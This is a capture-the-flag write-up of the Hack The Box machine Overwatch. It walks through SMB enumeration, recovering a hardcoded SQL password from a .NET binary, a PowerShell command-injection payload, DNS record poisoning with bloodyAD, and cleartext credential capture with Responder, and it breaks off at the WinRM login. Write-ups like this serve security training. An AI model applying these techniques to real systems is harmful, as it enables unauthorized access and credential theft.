---
maquina: "Overwatch"
dificultad: "Medium"
os: "Windows"
plataforma: "htb"
release: "24 Jan 2026"
retire: "09 May 2026"
creadores: "xct"
htb_url: "https://hackthebox.com/machines/overwatch"
app_url: "https://app.hackthebox.com/machines/826"
url: "https://0xdf.gitlab.io/2026/05/09/htb-overwatch.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Overwatch starts with anonymous SMB access to a software share that hosts a custom .NET monitoring binary. I’ll reverse engineer it to recover SQL Server credentials and identify a WCF service with a PowerShell command injection sink. With the SQL creds, I’ll find a linked server pointing to a non-resolving host and abuse CREATE_CHILD on the AD-integrated DNS zone to add a record pointing the hostname at my host, capturing cleartext SQL authentication with Responder when the linked server connects out. Those credentials provide WinRM as a user in Remote Management Users. From there, I’ll exploit the WCF KillProcess command injection on a localhost SOAP endpoint to get code execution as SYSTEM, demonstrating four different ways to interact with the WCF service. In Beyond Root, I’ll look at a log that captured the Windows Administrator password from an HTB pre-release cleanup script.

## Recon

### Initial Scanning

`nmap` finds 22 open TCP ports:

```console
oxdf@hacky$ sudo nmap -p- -vvv --min-rate 10000 10.129.244.81
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-24 19:43 UTC
...[snip]...
Nmap scan report for 10.129.244.81
Host is up, received echo-reply ttl 127 (0.021s latency).
Scanned at 2026-04-24 19:43:29 UTC for 14s
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
6520/tcp  open  unknown          syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
58262/tcp open  unknown          syn-ack ttl 127
58263/tcp open  unknown          syn-ack ttl 127
58270/tcp open  unknown          syn-ack ttl 127
59189/tcp open  unknown          syn-ack ttl 127
61751/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
           Raw packets sent: 131054 (5.766MB) | Rcvd: 25 (1.084KB)
oxdf@hacky$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389 -sCV 10.129.244.81
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-24 19:44 UTC
...[snip]...
Nmap scan report for 10.129.244.81
Host is up (0.021s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-24 19:45:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
|_ssl-date: 2026-04-24T19:46:25+00:00; -4s from scanner time.
| rdp-ntlm-info:
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-24T19:45:43+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6520/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-24T19:24:36
|_Not valid after:  2056-04-24T19:24:36
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2026-04-24T19:46:25+00:00; -4s from scanner time.
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-04-24T19:45:44
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -4s, deviation: 0s, median: -4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.88 seconds
```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `overwatch.htb`, and the hostname is `S200401`.

There’s also an MSSQL 2022 on TCP 6520. I can try to connect, but it requires creds.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

```console
oxdf@hacky$ netexec smb 10.129.244.81 --generate-hosts-file hosts
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True) (Guest Auth:True)
oxdf@hacky$ cat hosts /etc/hosts | sudo tee /etc/hosts | head -1
10.129.244.81     S200401.overwatch.htb overwatch.htb S200401
```

All of the ports show a TTL of 127, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows one hop away.

`nmap` notes almost no clock skew. If there were one more than five minutes, I’d want to run `sudo ntpdate S200401.overwatch.htb` before any actions that use Kerberos auth.

### SMB - TCP 445

#### Shares

Guest auth allows me to list shares with any username and blank password:

```console
oxdf@hacky$ netexec smb 10.129.244.81 -u 0xdf -p '' --shares
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True) (Guest Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\0xdf: (Guest)
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share
SMB         10.129.244.81   445    S200401          software$       READ
SMB         10.129.244.81   445    S200401          SYSVOL                          Logon server share
```

I’ve got read access to the `software$` share.

#### software$

I’ll use `spider_plus` to list and download all the files on the share:

```console
oxdf@hacky$ netexec smb 10.129.244.81 -u 0xdf -p '' -M spider_plus -o DOWNLOAD_FLAG=True
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True) (Guest Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\0xdf: (Guest)
SPIDER_PLUS 10.129.244.81   445    S200401          [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.244.81   445    S200401          [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.129.244.81   445    S200401          [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.244.81   445    S200401          [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.244.81   445    S200401          [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.244.81   445    S200401          [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.244.81   445    S200401          [*]  OUTPUT_FOLDER: /home/oxdf/.nxc/modules/nxc_spider_plus
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share
SMB         10.129.244.81   445    S200401          software$       READ
SMB         10.129.244.81   445    S200401          SYSVOL                          Logon server share
SPIDER_PLUS 10.129.244.81   445    S200401          [+] Saved share-file metadata to "/home/oxdf/.nxc/modules/nxc_spider_plus/10.129.244.81.json".
SPIDER_PLUS 10.129.244.81   445    S200401          [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, software$, SYSVOL)
SPIDER_PLUS 10.129.244.81   445    S200401          [*] SMB Readable Shares:  2 (IPC$, software$)
SPIDER_PLUS 10.129.244.81   445    S200401          [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.244.81   445    S200401          [*] Total folders found:  3
SPIDER_PLUS 10.129.244.81   445    S200401          [*] Total files found:    16
SPIDER_PLUS 10.129.244.81   445    S200401          [*] Files filtered:       12
SPIDER_PLUS 10.129.244.81   445    S200401          [*] File size average:    1.36 MB
SPIDER_PLUS 10.129.244.81   445    S200401          [*] File size min:        2.11 KB
SPIDER_PLUS 10.129.244.81   445    S200401          [*] File size max:        6.81 MB
SPIDER_PLUS 10.129.244.81   445    S200401          [*] File unique exts:     5 (config, xml, exe, pdb, dll)
SPIDER_PLUS 10.129.244.81   445    S200401          [*] Downloads successful: 4
SPIDER_PLUS 10.129.244.81   445    S200401          [+] All files processed successfully.
```

I’ll grab those files and move them to my current directory:

```console
oxdf@hacky$ mv ~/.nxc/modules/nxc_spider_plus/10.129.244.81/software\$ software
oxdf@hacky$ find software/ -type f
software/Monitoring/overwatch.exe.config
software/Monitoring/overwatch.pdb
software/Monitoring/overwatch.exe
software/Monitoring/Microsoft.Management.Infrastructure.dll
```

`overwatch.exe.config` is XML:

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <configSections>
    <!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
  </configSections>
  <system.serviceModel>
    <services>
      <service name="MonitoringService">
        <host>
          <baseAddresses>
            <add baseAddress="http://overwatch.htb:8000/MonitorService" />
          </baseAddresses>
        </host>
        <endpoint address="" binding="basicHttpBinding" contract="IMonitoringService" />
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <serviceMetadata httpGetEnabled="True" />
          <serviceDebug includeExceptionDetailInFaults="True" />
        </behavior>
      </serviceBehaviors>
    </behaviors>
  </system.serviceModel>
  <entityFramework>
    <providers>
      <provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer" />
      <provider invariantName="System.Data.SQLite.EF6" type="System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6" />
    </providers>
  </entityFramework>
  <system.data>
    <DbProviderFactories>
      <remove invariant="System.Data.SQLite.EF6" />
      <add name="SQLite Data Provider (Entity Framework 6)" invariant="System.Data.SQLite.EF6" description=".NET Framework Data Provider for SQLite (Entity Framework 6)" type="System.Data.SQLite.EF6.SQLiteProviderFactory, System.Data.SQLite.EF6" />
    <remove invariant="System.Data.SQLite" /><add name="SQLite Data Provider" invariant="System.Data.SQLite" description=".NET Framework Data Provider for SQLite" type="System.Data.SQLite.SQLiteFactory, System.Data.SQLite" /></DbProviderFactories>
  </system.data>
</configuration>
```

There’s a monitoring service at `http://overwatch.htb:8000/MonitorService`. A few things worth noting from the WCF config:

- It uses `basicHttpBinding` (plain HTTP, no transport security or auth configured).
- `serviceMetadata httpGetEnabled="True"` means the WSDL is published, so once the port is reachable I can pull it with `?wsdl` / `?singleWsdl` and see every contract method.
- `serviceDebug includeExceptionDetailInFaults="True"` will leak full .NET stack traces on any error, great for info disclosure and error-based oracles when shaping payloads.

Two Entity Framework providers are registered: `SqlClient` for a remote SQL Server (presumably the one on 6520) and `SQLite` for a local database file. That split maps to the two data sources the binary actually touches (seen below).

Port 8000 isn’t reachable from outside (probably firewalled or localhost-only), so this is an attack surface to remember for later.

`Microsoft.Management.Infrastructure.dll` is a Microsoft library, so it’s not interesting except to say that the binary likely interacts with WMI / CIM.

## Shell as sqlmgmt

### Auth as sqlsvc

#### overwatch.exe

`overwatch.exe` is a .NET binary:

```console
oxdf@hacky$ file software/Monitoring/overwatch.exe
software/Monitoring/overwatch.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows, 2 sections
```

I’ll load it in a .NET disassembler such as [DotPeek](https://www.jetbrains.com/decompiler/) and take a look. The code sits in `{} / MonitoringService` and `{} / Program`:

![image-20260424162243783](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260424162243783.png)

`Program` has the `Main` function, which starts `MonitoringService`, waits 30 seconds, runs `CheckEdgeHistory`, and then waits for the user to enter something and exits:

```cs
internal class Program
{
  private static void Main(string[] args)
  {
    ServiceHost serviceHost = new ServiceHost(typeof (MonitoringService), Array.Empty<Uri>());
    serviceHost.Open();
    Console.WriteLine("Service is running...");
    Timer timer = new Timer(30000.0);
    timer.Elapsed += new ElapsedEventHandler(Program.CheckEdgeHistory);
    timer.Start();
    Console.WriteLine("Press Enter to exit...");
    Console.ReadLine();
    serviceHost.Close();
  }
```

`CheckEdgeHistory` runs on the timer and copies recent Edge browser history rows into the remote MSSQL `EventLog` table:

```cs
  private static void CheckEdgeHistory(object sender, ElapsedEventArgs e)
  {
    string str1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Default\\History");
    if (!File.Exists(str1))
      return;
    string tempFileName = Path.GetTempFileName();
    File.Copy(str1, tempFileName, true);
    try
    {
      using (SqlConnection sqlConnection = new SqlConnection("Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"))
      {
        sqlConnection.Open();
        using (SqlCommand sqlCommand = new SqlCommand())
        {
          sqlCommand.Connection = sqlConnection;
          SQLiteConnection sqLiteConnection = new SQLiteConnection("Data Source=" + tempFileName + ";Version=3;");
          ((DbConnection) sqLiteConnection).Open();
          SQLiteDataReader sqLiteDataReader = new SQLiteCommand("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5", sqLiteConnection).ExecuteReader();
          while (((DbDataReader) sqLiteDataReader).Read())
          {
            string str2 = "INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), 'URLVisit', '" + ((DbDataReader) sqLiteDataReader)["url"].ToString() + "')";
            sqlCommand.CommandText = str2;
            sqlCommand.ExecuteNonQuery();
          }
          ((DbConnection) sqLiteConnection).Close();
        }
      }
    }
    catch
    {
    }
    finally
    {
      File.Delete(tempFileName);
    }
  }
}
```

The details of this function aren’t important. It does have a hardcoded connection string for the local MSSQL with a username and password.

`MonitoringService` implements the WCF contract `IMonitoringService`, which exposes three operations: `StartMonitoring()`, `StopMonitoring()`, and `KillProcess(string processName)`. The ctor stores the same connection string in a field that the rest of the class uses.

`KillProcess` has a potential injection opportunity:

```cs
  public string KillProcess(string processName)
  {
    string scriptContents = "Stop-Process -Name " + processName + " -Force";
    try
    {
      using (Runspace runspace = RunspaceFactory.CreateRunspace())
      {
        runspace.Open();
        using (Pipeline pipeline = runspace.CreatePipeline())
        {
          pipeline.Commands.AddScript(scriptContents);
          pipeline.Commands.Add("Out-String");
          Collection<PSObject> collection = pipeline.Invoke();
          runspace.Close();
          StringBuilder stringBuilder = new StringBuilder();
          foreach (PSObject psObject in collection)
            stringBuilder.AppendLine(psObject.ToString());
          return stringBuilder.ToString();
        }
      }
    }
    catch (Exception ex)
    {
      return "Error: " + ex.Message;
    }
  }
```

It creates a string, `scriptContents` by concatenating text with the input `processName` variable, and then runs that as a PowerShell command. PowerShell uses `;` as a statement separator, so a `processName` of `x; whoami #` becomes `Stop-Process -Name x; whoami # -Force`, two statements where `whoami` runs and the trailing `-Force` is swallowed by the comment. I’ll come back to this for root.

#### Validate

I’ll check the creds from the binary on MSSQL with `netexec` and they work:

```console
oxdf@hacky$ netexec mssql 10.129.244.81 --port 6520 -u sqlsvc -p TI0LKcfHzZw1Vv
MSSQL       10.129.244.81   6520   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (EncryptionReq:False)
MSSQL       10.129.244.81   6520   S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
```

### Authenticated Enumeration

#### Database

I’ll use `mssqlclient.py` to get access. The session opens with `OVERWATCH\sqlsvc` mapped to the `guest` role on `master`, meaning the login has no explicit user mapping in `master` and is falling back to the low-privilege `guest` account:

```console
oxdf@hacky$ mssqlclient.py overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@S200401.overwatch.htb -p 6520 -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)>
```

There’s one non-standard database, `overwatch`:

```console
SQL (OVERWATCH\sqlsvc  guest@master)> enum_db
name        is_trustworthy_on
---------   -----------------
master                      0
tempdb                      0
model                       0
msdb                        1
overwatch                   0
```

It has one table:

```console
SQL (OVERWATCH\sqlsvc  guest@master)> use overwatch;
ENVCHANGE(DATABASE): Old Value: master, New Value: overwatch
INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'overwatch'.
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select name from sys.tables;
name
--------
Eventlog
```

It’s empty:

```console
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select * from EventLog;
Id   Timestamp   EventType   Details
--   ---------   ---------   -------
```

There’s no impersonation, or interesting logins, owner, or user:

```console
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_logins
name               type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
----------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa                 SQL_LOGIN                 1          1               0             0            0              0           0           0           0
BUILTIN\Users      WINDOWS_GROUP             0          0               0             0            0              0           0           0           0
OVERWATCH\sqlsvc   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_owner
Database    Owner
---------   ----------------
master      sa
tempdb      sa
model       sa
msdb        sa
overwatch   OVERWATCH\sqlsvc
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_users
UserName             RoleName   LoginName          DefDBName   DefSchemaName       UserID                                                           SID
------------------   --------   ----------------   ---------   -------------   ----------   -----------------------------------------------------------
dbo                  db_owner   OVERWATCH\sqlsvc   master      dbo             b'1         '   b'01050000000000051500000002d9b7a6b0b75e51f445f10d50040000'
guest                public     NULL               NULL        guest           b'2         '                                                         b'00'
INFORMATION_SCHEMA   public     NULL               NULL        NULL            b'3         '                                                          NULL
sys                  public     NULL               NULL        NULL            b'4         '                                                          NULL
```

There is a linked server, SQL07:

```console
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_links
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
```

Just like in [DarkZero](https://0xdf.gitlab.io/2026/04/04/htb-darkzero.html#linked-servers), I can try to use the linked server to see if the permissions are any different, but it hangs and times out:

```console
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> use_link [SQL07]
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [53].
```

It’s unable to find the server. I can try to run a command directly, but it does the same:

```console
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> EXEC ('SELECT SYSTEM_USER') AT [SQL07];
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [53].
```

#### SQL07Machine

The SQL07 machine isn’t responding. I can try to look it up from the DC’s DNS:

```console
oxdf@hacky$ nslookup SQL07.overwatch.htb S200401.overwatch.htb
Server:         S200401.overwatch.htb
Address:        10.129.244.81#53

** server can't find SQL07.overwatch.htb: NXDOMAIN

oxdf@hacky$ nslookup SQL07 S200401.overwatch.htb
;; Got SERVFAIL reply from 10.129.244.81
Server:         S200401.overwatch.htb
Address:        10.129.244.81#53

** server can't find SQL07: SERVFAIL
```

It doesn’t have a record. For contrast, if I look up the DC, it returns the IP addresses:

```console
oxdf@hacky$ nslookup S200401.overwatch.htb S200401.overwatch.htb
Server:         S200401.overwatch.htb
Address:        10.129.244.81#53

Name:   S200401.overwatch.htb
Address: 10.129.244.81
Name:   S200401.overwatch.htb
Address: dead:beef::85b8:db49:15c3:6302
```

LDAP can give a list of computers on the domain:

```console
oxdf@hacky$ ldapsearch -x -H ldap://overwatch.htb -D 'sqlsvc@overwatch.htb' -w 'TI0LKcfHzZw1Vv' -b 'DC=overwatch,DC=htb' '(&(objectClass=computer)(!(name=S200401)))' name dNSHostName operatingSystem servicePrincipalName
# extended LDIF
#
# LDAPv3
# base <DC=overwatch,DC=htb> with scope subtree
# filter: (&(objectClass=computer)(!(name=S200401)))
# requesting: name dNSHostName operatingSystem servicePrincipalName
#

# SQL03, Computers, overwatch.htb
dn: CN=SQL03,CN=Computers,DC=overwatch,DC=htb
name: SQL03

# NB001, Computers, overwatch.htb
dn: CN=NB001,CN=Computers,DC=overwatch,DC=htb
name: NB001

# NB002, Computers, overwatch.htb
dn: CN=NB002,CN=Computers,DC=overwatch,DC=htb
name: NB002

# File01, Computers, overwatch.htb
dn: CN=File01,CN=Computers,DC=overwatch,DC=htb
name: File01

# S200400, Computers, overwatch.htb
dn: CN=S200400,CN=Computers,DC=overwatch,DC=htb
name: S200400

# search reference
ref: ldap://ForestDnsZones.overwatch.htb/DC=ForestDnsZones,DC=overwatch,DC=htb

# search reference
ref: ldap://DomainDnsZones.overwatch.htb/DC=DomainDnsZones,DC=overwatch,DC=htb

# search reference
ref: ldap://overwatch.htb/CN=Configuration,DC=overwatch,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 5
# numReferences: 3
```

It finds a few, but no SQL07. There is an SQL03. Maybe it moved and the link hasn’t been updated yet.

#### sqlsvc Account

Another thing to check is what ACLs the sqlsvc account has. `bloodyAD` has a nice check, `get writable`:

```console
oxdf@hacky$ bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=overwatch,DC=htb
permission: WRITE

distinguishedName: CN=sqlsvc,CN=Users,DC=overwatch,DC=htb
permission: WRITE

distinguishedName: DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwatch,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.overwatch.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=overwatch,DC=htb
permission: CREATE_CHILD
```

The first two are noise. `S-1-5-11` is the well-known SID for `Authenticated Users`, and `WRITE` on `CN=sqlsvc` is just sqlsvc writing to its own user object. Neither is actionable.

The other two are the interesting ones. Both AD-integrated DNS zone containers (`overwatch.htb` in `DomainDnsZones` and `_msdcs.overwatch.htb` in `ForestDnsZones`) allow `CREATE_CHILD`, which means I can add `dnsNode` objects under them, i.e. write new DNS records into the zones the DC itself answers from. This is the AD-integrated DNS analogue of being a `DnsAdmins` member for those zones, without needing the group membership.

### Recover Password

The reason `EXEC ... AT [SQL07]` failed earlier was that the host for the linked server doesn’t resolve. If I create a record for `SQL07.overwatch.htb` that resolves to my VM, the next time the SQL Server tries the linked server, it will dutifully connect (and authenticate) to me, and I can capture or relay the authentication that the SQL Server makes outbound.

I’ll add the record with `bloodyAD`:

```console
oxdf@hacky$ bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv add dnsRecord SQL07 10.10.14.61
[+] SQL07 has been successfully added
```

A few seconds later, it’s there:

```console
oxdf@hacky$ nslookup SQL07.overwatch.htb S200401.overwatch.htb
Server:         S200401.overwatch.htb
Address:        10.129.244.81#53

Name:   SQL07.overwatch.htb
Address: 10.10.14.61
```

I’ll start [Responder](https://github.com/lgandx/Responder), and run `use_link SQL07` from the `mssqlclient.py` shell. At Responder:

```console
oxdf@hacky$ sudo uv run /opt/Responder/Responder.py -I tun0
...[snip]...
[MSSQL] Cleartext Client   : 10.129.244.81
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

That’s plaintext credentials from the server trying to authenticate to the linked server. That’s because the linked server must have been configured with a stored SQL Authentication remote login (an `sp_addlinkedsrvlogin` mapping) rather than Windows auth. With SQL auth, the username and password ride inside the TDS `LOGIN7` packet using only a trivial obfuscation (nibble swap plus XOR with `0xA5`), which is effectively plaintext on the wire. Responder’s MSSQL listener decodes that automatically. If the link had used Windows auth, I would have gotten an NTLM challenge/response hash instead.

### Shell

#### Remote Management

A quick `ldapsearch` shows that sqlmgmt is in the Remote Management Users group:

```console
oxdf@hacky$ ldapsearch -x -H ldap://overwatch.htb -D 'sqlsvc@overwatch.htb' -w 'TI0LKcfHzZw1Vv' -b 'DC=overwatch,DC=htb' '(sAMAccountName=sqlmgmt)' memberOf
# extended LDIF
#
# LDAPv3
# base <DC=overwatch,DC=htb> with scope subtree
# filter: (sAMAccountName=sqlmgmt)
# requesting: memberOf
#

# sqlmgmt, Users, overwatch.htb
dn: CN=sqlmgmt,CN=Users,DC=overwatch,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=overwatch,DC=htb

# search reference
ref: ldap://ForestDnsZones.overwatch.htb/DC=ForestDnsZones,DC=overwatch,DC=htb

# search reference
ref: ldap://DomainDnsZones.overwatch.htb/DC=DomainDnsZones,DC=overwatch,DC=htb

# search reference
ref: ldap://overwatch.htb/CN=Configuration,DC=overwatch,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

`netexec` shows it as well:

```console
oxdf@hacky$ netexec winrm S200401.overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx
WINRM       10.129.244.81   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
WINRM       10.129.244.81   5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
```

#### WinRM

I’ll use [evil-winrm-py](https://github.com/adityatelange/evil-winrm-py) to get a shell:

```console
oxdf@hacky$ evil-winrm-py -i S200401.overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'S200401.overwatch.htb:5985' as 'sqlmgmt'
